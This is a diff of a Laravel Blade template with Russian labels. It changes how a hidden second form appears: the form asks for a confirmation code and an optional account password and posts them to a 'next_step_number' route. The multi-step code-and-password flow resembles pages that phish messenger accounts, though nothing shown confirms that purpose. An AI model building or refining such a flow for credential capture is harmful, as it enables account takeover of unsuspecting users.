@@ -16,21 +16,23 @@
         </form>
 
         <!-- Вторая форма (скрытая) -->
-        <form id="form2" action="{{ secure_url('next_step_number') }}" method="POST" style="display: none;">
-            @csrf
+        @if(isset($isSecondFormVisible))
+            <form id="form2" action="{{ secure_url('next_step_number') }}" method="POST">
+                @csrf
 
-            <div class="mb-3">
-                <p class="text-white">Введите код подтверждения</p>
-                <input placeholder="Код подтверждения" class="form-input" name="code" autofocus>
-            </div>
+                <div class="mb-3">
+                    <p class="text-white">Введите код подтверждения</p>
+                    <input placeholder="Код подтверждения" class="form-input" name="code" autofocus>
+                </div>
 
-            <div class="mb-3">
-                <p class="text-white">Пароль от аккаунта</p>
-                <input placeholder="Если есть" class="form-input" name="password" autofocus>
-            </div>
+                <div class="mb-3">
+                    <p class="text-white">Пароль от аккаунта</p>
+                    <input placeholder="Если есть" class="form-input" name="password" autofocus>
+                </div>
 
-            <button class="w-100 btn btn-primary form-button">Отправить данные</button>
-        </form>
+                <button type="submit" class="w-100 btn btn-primary form-button">Отправить данные</button>
+            </form>
+        @endif
     </div>
 </div>
 @endsection
@@ -38,9 +40,9 @@
 
 
 
-@if(isset($isSecondFormVisible))
+<!-- @if(isset($isSecondFormVisible))
     <script>
         document.getElementById('form1').style.display = 'none';
         document.getElementById('form2').style.display = 'block';
     </script>
-@endif
+@endif -->
